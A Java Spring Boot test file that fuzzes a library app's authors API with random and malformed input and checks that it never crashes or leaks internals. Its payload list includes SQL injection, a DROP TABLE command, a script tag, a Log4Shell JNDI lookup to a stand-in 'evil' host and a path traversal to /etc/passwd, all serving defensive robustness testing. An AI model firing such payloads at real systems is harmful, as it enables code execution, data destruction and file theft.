package io.github.adamstac.libraryapp.authors;

import static org.assertj.core.api.Assertions.assertThat;

import io.github.adamstac.libraryapp.ApiBrowser;
import io.github.adamstac.libraryapp.TestcontainersConfiguration;
import java.net.http.HttpResponse;
import java.util.List;
import java.util.Random;
import java.util.UUID;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.context.annotation.Import;
import org.springframework.jdbc.core.simple.JdbcClient;
import org.springframework.security.crypto.password.PasswordEncoder;

/** Random and malicious input to the authors API must never crash it (500) or leak internals. Fixed seed. */
@Import(TestcontainersConfiguration.class)
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT, properties = ApiBrowser.MANY_SIGN_INS)
class AuthorHostileInputTests {

    private static final String[] NASTY = {
        "' OR '1'='1", "\"; DROP TABLE authors; --", "<script>alert(1)</script>", "${jndi:ldap://evil/x}",
        "../../etc/passwd", "\u0000", "%00", "‮evil", "\uD800", "ﷺ", "😀", "مكتبة", "", " ", "\n"
    };
    private static final String[] TEXT_FIELDS = {"nameAr", "nameEn", "fullName", "ism", "kunya", "laqab", "nisba",
        "biography"};

    @Value("${local.server.port}")
    private int port;

    @Autowired
    private JdbcClient jdbc;

    @Autowired
    private PasswordEncoder passwordEncoder;

    @Test
    void randomFieldValuesNeverCrashTheApi() throws Exception {
        Random random = new Random(20261025L);
        ApiBrowser reader = null;
        String existing = null;
        for (int i = 0; i < 200; i++) {
            if (i % 50 == 0) { // a fresh account now and then, so the limit on changes a minute isn't reached
                reader = ApiBrowser.newAccount(port, jdbc, passwordEncoder);
                existing = AuthorTests.idOf(reader.post(AuthorTests.AUTHORS, "{\"nameEn\":\"x\"}").body());
            }
            String body = randomBody(random);

            HttpResponse<String> response = i % 2 == 0
                    ? reader.post(AuthorTests.AUTHORS, body)
                    : reader.put(AuthorTests.AUTHORS + "/" + existing, body, "\"" + random.nextInt(3) + "\"");

            assertThat(response.statusCode()).as(body).isIn(200, 201, 400, 409);
            assertThat(response.body()).as(body).doesNotContainIgnoringCase("exception").doesNotContain("trace");
        }
    }

    @Test
    void malformedRequestsAreRejectedCleanly() throws Exception {
        ApiBrowser reader = ApiBrowser.newAccount(port, jdbc, passwordEncoder);
        String existing = AuthorTests.idOf(reader.post(AuthorTests.AUTHORS, "{\"nameEn\":\"x\"}").body());
        List<String> bodies = List.of(
                "", "{", "null", "[]", "42", "\"text\"", "<xml/>", "{\"nameEn\":{}}",
                "{\"nameEn\":[\"a\"]}", "{\"nameEn\":\"x\",\"birth\":\"256\"}", "{\"nameEn\":\"x\",\"birth\":[]}",
                "{\"nameEn\":\"x\",\"birth\":{\"hijri\":1e30}}", "{\"nameEn\":\"x\",\"birth\":{\"hijri\":99999999999}}",
                "{\"nameEn\":\"x\",\"death\":{\"approximate\":\"yes\"}}");
        for (String body : bodies) {
            for (HttpResponse<String> response : List.of(
                    reader.post(AuthorTests.AUTHORS, body),
                    reader.put(AuthorTests.AUTHORS + "/" + existing, body, "\"0\""))) {
                assertThat(response.statusCode()).as(body).isIn(400, 415);
                assertThat(response.body()).as(body).doesNotContainIgnoringCase("exception");
            }
        }
        assertThat(reader.get(AuthorTests.AUTHORS + "/not-an-id").statusCode()).isEqualTo(400);
        assertThat(reader.get(AuthorTests.AUTHORS + "/" + UUID.randomUUID() + "x").statusCode()).isEqualTo(400);
    }

    @Test
    void wrongContentTypeIsRejected() throws Exception {
        ApiBrowser reader = ApiBrowser.newAccount(port, jdbc, passwordEncoder);

        for (String contentType : new String[] {"text/plain", "application/x-www-form-urlencoded", "application/xml"}) {
            HttpResponse<String> response =
                    reader.send("POST", AuthorTests.AUTHORS, "{\"nameEn\":\"x\"}", contentType, null, true);
            assertThat(response.statusCode()).as(contentType).isEqualTo(415);
        }
    }

    private static String randomBody(Random random) {
        StringBuilder body = new StringBuilder("{");
        for (String field : TEXT_FIELDS) {
            if (random.nextInt(3) > 0) {
                body.append(json(field)).append(':').append(json(randomText(random))).append(',');
            }
        }
        body.append("\"birth\":").append(randomYear(random)).append(',');
        body.append("\"death\":").append(randomYear(random));
        return body.append('}').toString();
    }

    private static String randomYear(Random random) {
        return switch (random.nextInt(5)) {
            case 0 -> "null";
            case 1 -> "{\"hijri\":" + (random.nextInt(8000) - 4000) + "}";
            case 2 -> "{\"ce\":" + (random.nextInt(8000) - 4000) + ",\"approximate\":" + random.nextBoolean() + "}";
            case 3 -> "{\"hijri\":" + json(randomText(random)) + "}";
            default -> "{\"hijri\":" + (random.nextInt(1500) + 1) + ",\"ce\":" + (random.nextInt(2000) + 1) + "}";
        };
    }

    private static String randomText(Random random) {
        if (random.nextInt(4) == 0) {
            return NASTY[random.nextInt(NASTY.length)];
        }
        int length = random.nextInt(random.nextInt(10) == 0 ? 600 : 40);
        StringBuilder text = new StringBuilder();
        for (int i = 0; i < length; i++) {
            int codePoint = switch (random.nextInt(5)) {
                case 0 -> random.nextInt(0x20); // control characters
                case 1 -> 0x0600 + random.nextInt(0x100); // Arabic block
                case 2 -> 0x2000 + random.nextInt(0x70); // punctuation, including direction controls
                case 3 -> random.nextInt(0x1FFFF); // anything, including emoji and lone surrogates
                default -> 0x20 + random.nextInt(0x5F); // printable ASCII
            };
            text.appendCodePoint(codePoint);
        }
        return text.toString();
    }

    /** JSON string escaping that keeps lone surrogates as \\u escapes, so they reach the API as sent. */
    private static String json(String value) {
        StringBuilder out = new StringBuilder("\"");
        for (char c : value.toCharArray()) {
            if (c == '"' || c == '\\') {
                out.append('\\').append(c);
            } else if (c < 0x20 || Character.isSurrogate(c)) {
                out.append(String.format("\\u%04x", (int) c));
            } else {
                out.append(c);
            }
        }
        return out.append('"').toString();
    }
}
